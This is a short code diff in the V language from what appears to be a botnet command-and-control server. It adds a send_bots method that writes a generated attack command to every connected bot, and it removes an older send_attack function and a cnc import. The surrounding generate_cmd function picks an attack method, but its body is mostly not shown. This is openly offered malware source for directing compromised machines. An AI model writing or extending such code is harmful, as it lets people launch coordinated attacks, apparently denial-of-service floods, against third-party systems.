@@ -1,6 +1,12 @@
 module attack
 
-import core.cnc
+pub fn (mut a AttackInfo) send_bots() Responses {
+	println("here")
+	for  mut i in a.bots {
+		i.write_string(a.generate_cmd()) or { 0 }
+	}
+	return Responses.success
+}
 
 pub fn (mut a AttackInfo) generate_cmd() string {
 	match a.method {
@@ -18,11 +24,4 @@ pub fn (mut a AttackInfo) generate_cmd() string {
 		} else { return "" }
 	}
 	return ""
-}
-
-pub fn send_attack(mut a AttackInfo, mut b cnc.Bot_CNC) Attack {
-	cmd := a.generate_cmd()
-	if cmd.len < 2 { return Responses.invalid_method }
-	return Responses.success
-	
 }
